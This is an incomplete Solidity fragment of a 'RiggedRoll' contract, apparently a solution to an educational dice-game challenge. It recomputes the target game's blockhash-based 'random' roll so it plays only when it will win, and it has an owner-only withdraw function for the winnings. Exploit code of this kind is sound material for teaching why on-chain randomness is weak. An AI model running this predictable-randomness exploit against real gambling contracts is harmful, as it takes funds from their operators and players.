...
contract RiggedRoll is Ownable {
   ...
   //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) public payable onlyOwner {
        require(address(this).balance > 0, "No funds in contract to withdraw");
        require(_amount <= address(this).balance, "Withdraw amount must be lower than contract balance");
    ...
    function riggedRoll() public payable {
        require(address(this).balance >= .002 ether, "Not enough Eth to call riggedRoll 0.002 Eth needed");
        // Mimic randomness
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce() ));
        uint256 roll = uint256(hash) % 16;
        console.log("The rigged roll will be:", roll);

        require(roll <= 2, "Roll won't be less than 2 and will lose"); 
